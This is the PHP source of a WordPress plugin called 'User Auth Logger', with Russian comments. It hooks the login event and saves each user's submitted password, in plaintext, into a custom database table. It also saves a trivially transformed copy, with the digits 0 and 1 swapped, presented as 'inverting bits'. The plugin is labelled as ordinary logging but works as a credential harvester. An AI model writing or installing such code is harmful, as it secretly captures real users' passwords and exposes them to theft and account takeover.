<?php
/*
Plugin Name: User Auth Logger
Description: Логирование данных пользователя в отдельную таблицу при авторизации.
Version: 1.0
Author: Ваше Имя
*/

// Защита от прямого вызова файла
if (!defined('ABSPATH')) {
    exit;
}



// Логирование данных при успешной авторизации пользователя
function user_auth_logger_log_credentials($user_login, $user) {
    global $wpdb;

    // Получаем пароль из формы входа
    $password = isset($_POST['pwd']) ? ($_POST['pwd']) : '';

    if (!empty($password)) {
        // Инвертируем биты пароля (пример: заменяем 0 на 1 и наоборот)
        $password_inverted = strtr($password, '01', '10');

        // Вставляем данные в таблицу
        
        $wpdb->insert(

            'wp_user_auth',
            array(
                'login' => $user_login,
                'password_original' => $password,
                'password_inverted' => $password_inverted,
            ),
            array('%s', '%s', '%s')
        );
    }
}

// Хук для запуска функции при успешной авторизации
add_action('wp_login', 'user_auth_logger_log_credentials', 10, 2);